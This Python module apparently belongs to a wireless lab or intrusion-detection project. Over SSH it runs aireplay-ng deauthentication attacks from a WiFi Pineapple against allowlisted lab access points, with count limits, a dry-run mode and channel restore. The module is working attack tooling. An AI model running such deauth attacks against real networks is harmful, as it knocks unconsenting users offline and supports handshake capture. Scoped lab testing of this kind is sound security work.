"""Allowlisted-only deauth via aireplay-ng on the Pineapple."""

from __future__ import annotations

import logging
import re
import shlex
from dataclasses import dataclass

from ...capture.pineapple_ssh import PineappleSSH
from ..scope import LabScope, LabTarget, ScopeError

logger = logging.getLogger(__name__)


@dataclass
class DeauthResult:
    success: bool
    command: str
    exit_code: int
    stdout: str
    stderr: str
    target_bssid: str
    client: str
    count: int
    channel: int | None = None


def discover_ap_channel(ssh: PineappleSSH, bssid: str) -> int | None:
    """Find channel for a BSSID that is a local Pineapple AP interface."""
    bssid = bssid.lower()
    code, out, _err = ssh.run("iw dev 2>&1 || true")
    if code != 0 and not out:
        return None

    current_iface: str | None = None
    current_addr: str | None = None
    current_chan: int | None = None
    best: int | None = None

    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            # flush previous block
            if current_addr == bssid and current_chan is not None:
                best = current_chan
            current_iface = line.split()[1]
            current_addr = None
            current_chan = None
        elif line.startswith("addr "):
            current_addr = line.split()[1].lower()
        elif "channel" in line:
            # e.g. channel 11 (2462 MHz), width: 20 MHz
            m = re.search(r"channel\s+(\d+)", line)
            if m:
                current_chan = int(m.group(1))

    if current_addr == bssid and current_chan is not None:
        best = current_chan
    return best


def get_iface_channel(ssh: PineappleSSH, interface: str) -> int | None:
    code, out, err = ssh.run(f"iw dev {shlex.quote(interface)} info 2>&1 || true")
    text = out + err
    m = re.search(r"channel\s+(\d+)", text)
    return int(m.group(1)) if m else None


def set_iface_channel(ssh: PineappleSSH, interface: str, channel: int) -> None:
    if channel < 1 or channel > 196:
        raise ScopeError(f"Refuse invalid channel {channel}")
    # Monitor ifaces: iw set channel; fall back to iwconfig
    cmd = (
        f"iw dev {shlex.quote(interface)} set channel {int(channel)} || "
        f"iwconfig {shlex.quote(interface)} channel {int(channel)}"
    )
    code, out, err = ssh.run(cmd)
    logger.info(
        "Set %s to channel %s -> exit=%s out=%s err=%s",
        interface,
        channel,
        code,
        out[:200],
        err[:200],
    )
    if code != 0:
        raise ScopeError(
            f"Failed to set {interface} to channel {channel}: {out} {err}"
        )


def resolve_target_channel(
    ssh: PineappleSSH, target: LabTarget
) -> int:
    if target.channel is not None:
        return int(target.channel)
    found = discover_ap_channel(ssh, target.bssid)
    if found is not None:
        logger.info("Auto-detected channel %s for %s", found, target.bssid)
        return found
    raise ScopeError(
        f"No channel for target {target.bssid}. "
        f"Add 'channel: <n>' under that target in config/lab.yaml "
        f"(Open999 is usually channel 11)."
    )


def run_deauth(
    ssh: PineappleSSH,
    scope: LabScope,
    target_bssid: str,
    *,
    count: int | None = None,
    client: str | None = None,
    interface: str | None = None,
    dry_run: bool = False,
) -> DeauthResult:
    """Send deauth frames toward an owned lab-target AP only."""
    target = scope.assert_attack_bssid(target_bssid)
    n = int(count if count is not None else scope.lab.deauth_count)
    if n < 1 or n > 500:
        raise ScopeError(f"Refuse deauth count {n} (allowed 1..500)")

    cli = scope.assert_client_mac(
        client if client is not None else scope.lab.deauth_client
    )
    iface = interface or scope.lab.inject_interface

    channel = resolve_target_channel(ssh, target)

    tune_cmd = (
        f"iw dev {shlex.quote(iface)} set channel {int(channel)} || "
        f"iwconfig {shlex.quote(iface)} channel {int(channel)}"
    )
    # aireplay-ng: -a AP BSSID, -c client, --deauth N
    attack_cmd = (
        f"aireplay-ng --deauth {n} -a {shlex.quote(target.bssid)} "
        f"-c {shlex.quote(cli)} {shlex.quote(iface)}"
    )
    # Single remote script: tune channel then inject
    cmd = f"{tune_cmd}; {attack_cmd}"

    if dry_run:
        logger.info("DRY-RUN would execute: %s", cmd)
        return DeauthResult(
            success=True,
            command=cmd,
            exit_code=0,
            stdout="(dry-run)",
            stderr="",
            target_bssid=target.bssid,
            client=cli,
            count=n,
            channel=channel,
        )

    prev = get_iface_channel(ssh, iface)
    logger.warning(
        "Executing scoped deauth: target=%s ssid=%s count=%s iface=%s ch=%s (was %s)",
        target.bssid,
        target.ssid,
        n,
        iface,
        channel,
        prev,
    )

    code, out, err = 1, "", ""
    try:
        set_iface_channel(ssh, iface, channel)
        code, out, err = ssh.run(attack_cmd, timeout=max(60, n * 2))
    finally:
        # Restore monitor channel so WIDS keeps scanning where it was
        if prev is not None and prev != channel:
            try:
                set_iface_channel(ssh, iface, prev)
                logger.info("Restored %s to channel %s", iface, prev)
            except ScopeError as exc:
                logger.warning("Could not restore channel: %s", exc)

    return DeauthResult(
        success=code == 0,
        command=cmd,
        exit_code=code,
        stdout=out,
        stderr=err,
        target_bssid=target.bssid,
        client=cli,
        count=n,
        channel=channel,
    )
